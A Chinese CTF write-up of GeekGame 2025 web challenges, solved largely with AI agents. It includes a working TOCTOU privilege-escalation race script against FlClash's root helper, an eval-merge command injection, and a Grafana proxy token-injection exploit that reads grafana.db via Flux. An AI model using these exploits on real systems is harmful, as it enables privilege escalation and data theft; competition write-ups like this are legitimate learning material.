
---
title: 'Geekgame 2025 Writeup -- Misc'
description: 'LLM的大胜利！'
publishDate: 2025-10-26 06:03:14
tags:
  - Technology
  - Life
  - Game
author: StatInfer

---

# Web

## EzMCP / web-ezmcp

先看看代码，发现`enable_builtin_tools`需要发起本地连接，和AI一起想了很久没想到绕过的方法，遂直接尝试一发（需要先保存cookies鉴权）：

```bash

curl -sS -i -X POST https://prob06-bgmgabnp.geekgame.pku.edu.cn/enable_builtin_tools
```

惊讶地发现直接成功了（xxxx
那还说啥，直接继续请求flag了，轻松拿到flag1
flag2简单vibe构造了一个请求体，利用源码中：

```python
def eval(code: str, variables: dict):
    print(f"[Builtin]:eval\n  code: {code}\n  variables: {variables}")
    local_vars = LocalVariables()
    merge(variables, local_vars)
    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
    result = simple_eval(code, names=local_vars)
    print(f"[Builtin]:eval result: {result}")
    return str(result)
```

`merge`简单粗暴合并variables的漏洞，把`subprocess`合进去，拿到flag2
![](<%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_2025-10-20_145631.png>)

补充：给trae的prompt如下：

```markdown
完成CTF题目，获取flag

题面：

本题中server.py是一个在堡垒机上运行的提供mcp服务的程序，你可以修改server.py，向其中添加mcp工具，然后通知我上传到堡垒机。题目环境可以访问堡垒机并调用其mcp工具。

你需要分析源码app.py、mcp_client.py、builtin_tools.py，

设法在题目环境 https://prob06-bgmgabnp.geekgame.pku.edu.cn/ 中获取flag2，你可能需要构造message、构造特定的mcp tool，调用相应tool（system、eval）获取flag2

你可以通过“curl -sS -i -X POST https://prob06-bgmgabnp.geekgame.pku.edu.cn/enable_builtin_tools”来激活builtin_tools

注意：server.py在堡垒机上运行，你应当修改server.py。app.py、builtin_tools.py和mcp_client.py在题目服务器上运行且不可修改
```

## 提权潜兵·新指导版 / web-clash

继续AI起手，这把先上trae
```markdown
完成CTF题目：

你需要在linux系统上从普通用户（用户名: nobody）提权，利用FlClash v0.8.90的TOCTOU漏洞，来读取/root目录下的flag_xxx_xxx文件的内容。flag的格式是“flag{xxx}”，其中的每一个字符都是ASCII字符。

提示，你应当利用fix.patch中揭示的漏洞TOCTOU漏洞。

题目环境具有python 和 requests库，但不具有网络。

关卡会运行一个后台服务，用 ps -ef可以看到。后台服务可以启动 Clash 内核

在本地，你需要利用Dockerfile构建容器进行模拟和测试。你应当在本地容器中测试通过之后，再与线上环境交互。由于容器是为了模拟线上环境，你不应该修改dockerfile

线上题目环境在prob02.geekgame.pku.edu.cn 10002 上，你可以使用python建立socket与之通信。

与线上环境交互时，需要输出token: 'GgT-DypCdeA6krEihbEAULw7IMgB_lP27QlQvO5rYEyAe-wDo-5cV1anse8AshkUBWSkh_Blyskoa46zQ-ECDCqoCjIH'进行鉴权。

题目源码和题目附件均在当前工作目录下，请尽全力解决问题。请将你的解题思路记录在writeup.md文件中，你应当记录你的解题进展、解题思路和解题过程。

你可以随时翻看writeup.md，确认已经尝试过的方向和尚未尝试过的方向。
```
下面是AI给的writeup

```markdown

# CTF Writeup: FlClash TOCTOU Privilege Escalation

This document outlines the process of exploiting a TOCTOU vulnerability in FlClash v0.8.90 to achieve privilege escalation and read a flag file.

## 1. Initial Analysis

The goal is to escalate from user `nobody` to `root` and read a flag from `/root/flag_xxx_xxx`. The vulnerability is a TOCTOU issue, hinted at by `fix.patch`.
My plan is as follows:
1.  Analyze `fix.patch` to understand the vulnerability.
2.  Set up a local testing environment using the provided `Dockerfile`.
3.  Develop an exploit to leverage the vulnerability.
4.  Test the exploit locally.
5.  Adapt and run the exploit against the remote server.
6.  Document findings and progress here.

## 2. Vulnerability Details

The helper service (`services/helper/src/service/hub.rs`) exposes `POST /start` that accepts JSON:
\```
{ "path": "/path/to/bin", "arg": "<socket or port>" }
\```
It computes SHA256 of `path` and compares to `env!("TOKEN")`, then executes `Command::new(path).arg(arg)` as `root` and streams stderr to `/logs`. This introduces TOCTOU: the hash is checked first, but the actual execution uses the same `path` later, allowing a race window to swap `path` to a malicious binary after hash verification but before spawn.

`fix.patch` confirms the mitigation: comment out hash check and hardcode execution path to `/root/secure/FlClashCore`.

## 3. Local Environment

- Dockerfile copies core to `/tmp/FlClashCore`, builds and runs `helper` as `root`, then switches to `nobody`.
- `helper` listens on `127.0.0.1:47890` for `/ping`, `/start`, `/stop`, `/logs`.
- `FlClashCore` supports Unix or TCP sockets; with empty `arg` it panics `dial unix: missing address`, with numeric `arg` it dials TCP `127.0.0.1:<arg>`.

## 4. Exploit Strategy

Two approaches:
- Symlink flip: Point `path` to a symlink rapidly toggling between the legit core and a small malicious shell script. Issue many `/start` requests to hit the race.
- Direct file swap: Use a working copy and overwrite it right after the hash calculation.

We used symlink flip for reliability.

## 5. Exploit Implementation

Script `toctou2.sh` (copied into container and executed):
- Create malicious script at `/tmp/FlClashCore.evil` that prints `/root/flag_*` paths and contents to stderr.
- Create symlink `/tmp/FlClashCore.link` initially pointing to `/tmp/FlClashCore`.
- Start a background loop that flips the symlink between legit and evil rapidly.
- In parallel, send ~500 `POST /start` requests with `{"path": "/tmp/FlClashCore.link", "arg": ""}` to trigger spawn.
- Finally fetch `/logs` to read captured output.

During local test, `/logs` contained:
\```
[FLAG] path=/root/flag_71509442_91783891
fake{flag1}
\```
which confirms privileged execution and flag reading.

## 6. Notes & Remote Adaptation

- The exact race success rate depends on file size and system load. Flipping symlink and batching `/start` calls increases odds.
- On remote server, set `API` to the helper URL. If `arg` must be numeric, pass a dummy port; the malicious script ignores it.
- If `/start` requires the exact SHA256 of `/tmp/FlClashCore`, ensure the symlink initially points to the legit core to pass the hash, then flip before spawn.

## 7. Conclusion

We exploited a TOCTOU race in `helper` to execute our payload as `root` and read the flag, validating the vulnerability and mitigation indicated in `fix.patch`.

```
是一个经典的TOCTOU漏洞。AI很接近成功了，可惜`sha256checksum`对`symlink`的结果始终是0，AI没能参透这一步，继续vibe一下：
![](<Pasted_image_20251026024007.png>)
即可拿到flag
```shell
#!/bin/bash
set -euo pipefail
API=${API:-http://127.0.0.1:47890}
LINK=${LINK:-/tmp/FlClashCore.link}
ORIG=${ORIG:-/tmp/FlClashCore}
EVIL=${EVIL:-/tmp/FlClashCore.evil}

cat > "$EVIL" <<'E2'
#!/bin/sh
for f in /root/flag_*; do
  echo "[FLAG] path=$f" >&2
  cat "$f" >&2
  sleep 0.000001
done
E2
chmod +x "$EVIL"

cp -f "$ORIG" "$LINK"

( while true; do cp -f "$ORIG" "$LINK"; cp -f "$EVIL" "$LINK"; done ) &

( python3 - <<'PY'
import os, json, urllib.request, time
api = os.environ.get("API","http://127.0.0.1:47890")
path = os.environ.get("LINK","/tmp/FlClashCore.link")
while(True):
    data = json.dumps({"path": path, "arg": "12345"}).encode()
    req = urllib.request.Request(api+"/start", data=data, headers={"Content-Type":"application/json"}, method="POST")
    try:
        urllib.request.urlopen(req, timeout=0.2).read()
    except Exception:
        pass
    time.sleep(0.001)
PY
) &

sleep 1
python3 - <<'PY'
import urllib.request, os
api = os.environ.get("API","http://127.0.0.1:47890")
print(urllib.request.urlopen(api+"/logs").read().decode())
PY

```
大体逻辑就是有`root`权限的`helper`能被通过`http`请求唤起`FlClashCore`，他检查`FlClashCore`的方法是检测他的`sha256checksum`，但是在检查完之后到运行之前没有其他的检查，因此可以卡到检查通过和运行之间的空子。反复覆盖恶意脚本和正确文件，卡到`checksum`和运行之间就可以拿到flag

flag2二阶段提示之后vibe了一下拿到了一个需要起http服务器的方法，看起来需要传文件到服务器上。比较麻烦就放弃了

## 高可信数据大屏 / web-grafana

继续起手agent
```markdown
完成CTF题目，寻找flag

本题由开源软件Grafana和InfluxDB构成，

题目中Grafana和Influx跑在同一个机器上、共享同一个文件系统。你的账号：用户名 geekgame，密码 geekgame，你的账号并没有权限。因此，你需要研究Grafana的设计与特性（重点研究其文档），设法在没有权限的情况下获取InfluxDB中的flag1

给出的源码中的管理员账号用户名为admin，密码为admin，但实际题目的管理员密码与此不同。

flag1在InfluxDB中，Flag2在Grafana管理员的邮箱字段中。具体参见 entrypoint_geekgame.sh

在连接到题目环境 https://prob04-uxjsra5i.geekgame.pku.edu.cn/login 前，你需要先在本地，利用docker构建容器环境，测试你的解决方案。

你现在只需要尝试获取flag1

你可以把你的解题思路写入writeup.md，并及时更新
```

得到的writeup如下：

```markdown

# Writeup: Grafana+InfluxDB 获取 flag1（本地复现）

## 环境与版本

- Grafana: `grafana/grafana:12.2-ubuntu`
- InfluxDB: `influxdb2`（容器内安装）
- 启动脚本：`entrypoint_geekgame.sh`
- 关键端口：Grafana `3000`，InfluxDB `8086`

## 题目初始化逻辑（从源码推断）

- 启动 InfluxDB，执行 `influx setup` 建立组织 `org`、默认桶 `empty`、令牌 `token`。
- 随机创建 `secret_<BUCKET_NAME>` 桶，并写入：`measurement` 为 `flag1`、`field` 为 `value`、`string` 为 flag。
- 启动 Grafana，并将管理员邮箱写入（flag2 不在本题范围）。
- Grafana 预置了一个 Influx 数据源（id=1），类型 `influxdb`、`access=proxy`、`url=http://127.0.0.1:8086`，其 `json_data` 中存在 `dbName: empty`。这是 InfluxQL 模式的数据源（非 Flux）。

## 思路概述

利用 Grafana 的数据源代理（proxy）在 viewer 权限下发起 InfluxQL 请求：
1. 使用 viewer 账号登录 Grafana，获取会话 Cookie。
2. 通过 InfluxQL 端点枚举数据库（即 InfluxDB v1 的数据库概念，对 v2 桶有兼容映射），从而发现 `secret_<number>` 桶名。
3. 使用 InfluxQL 查询该桶中的 `flag1` measurement 的 `value` 字段，拿到 flag1。

注意：Grafana 的 InfluxDB 插件支持两种模式：InfluxQL 和 Flux。题目给的预置数据源（id=1）是 InfluxQL，因此 viewer 可以通过 `/api/datasources/proxy/1/query` 发起查询，无需掌握 token。

## 具体步骤（本地）

1. 构建并启动：
   \```bash
   docker-compose build
   docker-compose up -d
   \```
2. 以 viewer 登录并枚举数据库：
   ```bash
   curl -s -c cookies.txt -H 'Content-Type: application/json' \
     -d '{"user":"geekgame","password":"geekgame"}' \
     http://127.0.0.1:3000/login

   # 列出数据库（对应 v2 的桶）
   curl -s -b cookies.txt \
     'http://127.0.0.1:3000/api/datasources/proxy/1/query?db=empty&q=SHOW%20DATABASES'
   \```
   返回示例：
   \```json
   {"results":[{"series":[{"name":"databases","columns":["name"],"values":[["_monitoring"],["_tasks"],["empty"],["secret_138396091"]]}]}]}
   \```
3. 查询 flag1：
   \```bash
   curl -s -b cookies.txt \
     'http://127.0.0.1:3000/api/datasources/proxy/1/query?db=secret_138396091&q=SELECT%20%22value%22%20FROM%20%22flag1%22%20ORDER%20BY%20time%20DESC%20LIMIT%201'
   \```
   返回示例：
   \```json
   {"results":[{"series":[{"name":"flag1","columns":["time","value"],"values":[["2025-10-20T23:23:49Z","flag{test_local_flag1}"]]}]}]}
   \```

## 关键点与原因

- Grafana 的数据源代理会代表用户向 InfluxDB 发起请求。对于 InfluxQL 模式的数据源，Grafana 在数据源配置中保存了连接信息和必要的凭证（若需要），viewer 也可以通过代理发起只读查询。
- 在题目环境中，虽然管理员密码未知，但 viewer 登录即可使用已经配置好的数据源代理端点。
- InfluxDB v2 的兼容层允许通过 InfluxQL 的 `SHOW DATABASES` 列出桶名，这使得我们可以发现 `secret_*` 桶。

## 线上环境操作提示

- 访问题目地址登录：`https://prob04-uxjsra5i.geekgame.pku.edu.cn/login`（账号：`geekgame/geekgame`）。
- 找到数据源 ID（通常可以通过 `/api/datasources` 或通过浏览器查看数据源页面 URL 中的 ID/UID）。
- 如果 InfluxQL 数据源存在（类似本地 id=1），使用：
  - 列库：`/api/datasources/proxy/<id>/query?db=empty&q=SHOW%20DATABASES`
  - 查 flag：`/api/datasources/proxy/<id>/query?db=secret_<number>&q=SELECT%20%22value%22%20FROM%20%22flag1%22%20ORDER%20BY%20time%20DESC%20LIMIT%201`
- 若仅有 Flux 数据源且 viewer 直接请求被拒绝，则需要在 Grafana 中寻找可视化查询端点或已公开的面板查询接口；但从题目给定的本地配置看，存在 InfluxQL 代理即可完成读取。

## 结论

在不掌握管理员密码的情况下，利用 Grafana 的 InfluxQL 数据源代理，通过 viewer 权限即可枚举并查询 InfluxDB 的 `secret_*` 桶，从而读取 `flag1`。


# Writeup: Grafana+InfluxDB 获取 flag2（远程环境）

## 成功获取 flag2（远程环境）

- 利用条件：Grafana 与 InfluxDB 同机共享文件系统，Grafana 数据源代理会把 `X-DS-Authorization` 透传为下游 `Authorization`（详见 `keypointSrc.go` 的 `X-DS-Authorization` 处理逻辑）。
- 核心思路：通过 Grafana 的 Influx v2 代理执行 Flux 的 `sql.from(driverName: "sqlite3")`，直接读取 `/var/lib/grafana/grafana.db` 中管理员邮箱字段。

## 操作步骤

- 登录题目站点：`https://prob04-hrgm32n7.geekgame.pku.edu.cn/login`（账号 `geekgame/geekgame`）。
- 发送 Flux 查询到数据源代理（ID=1）：
  - 请求头：`Accept: text/csv`、`Content-Type: application/vnd.flux`、`X-DS-Authorization: Token token`。
  - 请求路径：`/api/datasources/proxy/1/api/v2/query?org=org`。
  - Flux 载荷：
    import "sql"
    sql.from(driverName: "sqlite3", dataSourceName: "/var/lib/grafana/grafana.db", query: "select email from user where login='admin'")

## 返回与解码

- 返回 CSV 中 `email` 列为十六进制：
  666c61677b70723176314c6547652d657363414c6154494f6e2d574954482d4c4f56336c792d496e466c757844627d0a
- 解码命令：`printf "666c61677b70723176314c6547652d657363414c6154494f6e2d574954482d4c4f56336c792d496e466c757844627d0a" | xxd -r -p | tr -d '\n'`

## 结果

- flag2：`flag{pr1v1LeGe-escALaTIOn-WITH-LOV3ly-InFluxDb}`。
- 已在本地输出目录验证：`/home/[REDACTED]/geekgame/web-grafana/exfil_out/flag2.txt`。

## 复现脚本

- 已添加脚本：`/home/[REDACTED]/geekgame/web-grafana/exfil_flag2.sh`，自动登录、枚举数据源并执行上述 Flux，输出至 `exfil_out/` 目录。

## 关键点回顾

- `keypointSrc.go` 中代理逻辑会将 `X-DS-Authorization` 覆盖到 `Authorization`，允许我们在 viewer 身份下向 InfluxDB 注入令牌。
- InfluxDB2 的 Flux `sql` 包支持 `sqlite3`，因此能按文件名读取同机上的 `grafana.db`。
```
也就是说InfuxQL查询DB是不需要权限的，枚举数据库找到桶名直接查询即可
![](<Pasted_image_20251026025246.png>)

但是LLM解决二阶段遇到了困难。在拿到二阶段提示后继续尝试：
```markdown
完成CTF题目，寻找flag

本题由开源软件Grafana和InfluxDB构成，

你的账号：用户名 geekgame，密码 geekgame，你的账号并没有权限。因此，你需要设法在没有权限的情况下获取在Grafana管理员的邮箱字段中的flag2。具体参见 entrypoint_geekgame.sh

重要提示！！！Grafana和Influx跑在**同一个机器上**、共享**同一个文件系统**，这是取出flag2的关键

提示：InfluxDB 可以按文件名读取 SQLite 数据库。

与解题相关的关键源代码在 keypointSrc.go 中

给出的源码中的管理员账号用户名为admin，密码为admin，但实际题目的管理员密码与此不同。

请连接到题目环境 https://prob04-hrgm32n7.geekgame.pku.edu.cn/login 获取flag2

**重要要求**你现在只需要尝试获取flag2，因为flag1:flag{ToTallY-No-PerMiSsIon-In-grAFanA}已经得到了。
```
然后又一遍拿到了解法：
```markdown
- Grafana 与 InfluxDB 同机共享文件系统，Grafana 数据源代理会将 X-DS-Authorization 透传为下游请求的 Authorization （你仓库的 keypointSrc.go 里明确处理了这一点）。
- 使用 Grafana 的 Influx v2 代理执行 Flux sql.from(driverName: "sqlite3") ，按文件名读取 /var/lib/grafana/grafana.db ，查询 user 表中 login='admin' 的 email 字段。
- 邮箱被写入为十六进制字符串，拿到后本地解码即为 flag2。
关键请求

- 登录： POST https://prob04-hrgm32n7.geekgame.pku.edu.cn/login ，载荷 {"user":"geekgame","password":"geekgame"}
- 代理查询： POST /api/datasources/proxy/1/api/v2/query?org=org
  - 头部： Accept: text/csv , Content-Type: application/vnd.flux , X-DS-Authorization: Token token
  - Flux 载荷：
    - import "sql"
    - sql.from(driverName: "sqlite3", dataSourceName: "/var/lib/grafana/grafana.db", query: "select email from user where login='admin'")
- 返回的 email 列是十六进制字符串：
  - 666c61677b70723176314c6547652d657363414c6154494f6e2d574954482d4c4f56336c792d496e466c757844627d0a
- 解码命令： printf "<hex>" | xxd -r -p | tr -d '\n'
```
利用`Grafana`代理的透传方式，同时用Influx v2按照文件名读取数据库
```shell
#!/usr/bin/env bash
set -euo pipefail
BASE="https://prob04-hrgm32n7.geekgame.pku.edu.cn"
COOKIE="/home/[REDACTED]/geekgame/web-grafana/cookies_prob04.txt"
ORG_ID=1
ORG_NAME="org"
AUTH_TOKEN_HEADER="X-DS-Authorization: Token token"
OUTDIR="/home/[REDACTED]/geekgame/web-grafana/exfil_out"
mkdir -p "$OUTDIR"
```
```markdown
# Login

curl -sk -D "$OUTDIR/login_headers.txt" -c "$COOKIE" -b "$COOKIE" \
  -H 'Content-Type: application/json' -H "X-Grafana-Org-Id: $ORG_ID" \
  -X POST "$BASE/login" -d '{"user":"geekgame","password":"geekgame"}' \
  -o "$OUTDIR/login_body.json"

# WhoAmI

curl -sk -D "$OUTDIR/user_headers.txt" -b "$COOKIE" -H "X-Grafana-Org-Id: $ORG_ID" \
  "$BASE/api/user" -o "$OUTDIR/user.json"

# Probe datasource proxy IDs

> "$OUTDIR/id_status.txt"
for id in $(seq 1 20); do
  hs=$(curl -sk -I -b "$COOKIE" -H "X-Grafana-Org-Id: $ORG_ID" \
    "$BASE/api/datasources/proxy/$id/health" -o /dev/null -w "%{http_code}") || hs="ERR"
  qs=$(curl -sk -I -b "$COOKIE" -H "X-Grafana-Org-Id: $ORG_ID" -H "$AUTH_TOKEN_HEADER" \
    -H 'Content-Type: application/vnd.flux' -X POST \
    "$BASE/api/datasources/proxy/$id/api/v2/query?org=$ORG_NAME" -o /dev/null -w "%{http_code}") || qs="ERR"
  echo "id=$id health=$hs query=$qs" | tee -a "$OUTDIR/id_status.txt"
done

# Flux to read admin email from grafana.db via SQLite

cat > "$OUTDIR/read_admin_email.flux" <<'EOF'
import "sql"
sql.from(driverName: "sqlite3", dataSourceName: "/var/lib/grafana/grafana.db", query: "select email from user where login='admin'")
EOF

# Run flux against each candidate id and save outputs

for id in $(seq 1 20); do
  echo "===== Proxy id $id =====" | tee "$OUTDIR/flux_${id}.log"
  curl -sk -D "$OUTDIR/flux_${id}_headers.txt" -b "$COOKIE" -H "X-Grafana-Org-Id: $ORG_ID" -H "$AUTH_TOKEN_HEADER" \
    -H 'Accept: text/csv' -H 'Content-Type: application/vnd.flux' -X POST \
    "$BASE/api/datasources/proxy/$id/api/v2/query?org=$ORG_NAME" \
    --data-binary @"$OUTDIR/read_admin_email.flux" -o "$OUTDIR/flux_${id}.csv" || true
  # Try JSON as well
  curl -sk -D "$OUTDIR/flux_${id}_headers_json.txt" -b "$COOKIE" -H "X-Grafana-Org-Id: $ORG_ID" -H "$AUTH_TOKEN_HEADER" \
    -H 'Accept: application/json' -H 'Content-Type: application/vnd.flux' -X POST \
    "$BASE/api/datasources/proxy/$id/api/v2/query?org=$ORG_NAME" \
    --data-binary @"$OUTDIR/read_admin_email.flux" -o "$OUTDIR/flux_${id}.json" || true
  # Extract likely hex strings
  grep -Eo '([0-9a-f]{8,})' "$OUTDIR/flux_${id}.csv" | head -n 5 > "$OUTDIR/hex_${id}.txt" || true
  grep -Eo '([0-9a-f]{8,})' "$OUTDIR/flux_${id}.json" | head -n 5 >> "$OUTDIR/hex_${id}.txt" || true
done

# Summarize hex hits

( for id in $(seq 1 20); do
    if [[ -s "$OUTDIR/hex_${id}.txt" ]]; then
      echo "id=$id"; cat "$OUTDIR/hex_${id}.txt"; echo
    fi
  done ) > "$OUTDIR/hex_summary.txt"

# Attempt to decode first hit

first_id=$(awk -F'=' '/^id=/{print $2; exit}' "$OUTDIR/hex_summary.txt" || true)
if [[ -n "${first_id:-}" ]]; then
  first_hex=$(grep -Eo '([0-9a-f]{8,})' "$OUTDIR/hex_${first_id}.txt" | head -n 1 || true)
  if [[ -n "${first_hex:-}" ]]; then
    printf "%s" "$first_hex" | xxd -r -p > "$OUTDIR/flag2.txt" || true
  fi
fi

echo "Done. Check $OUTDIR for outputs."
```
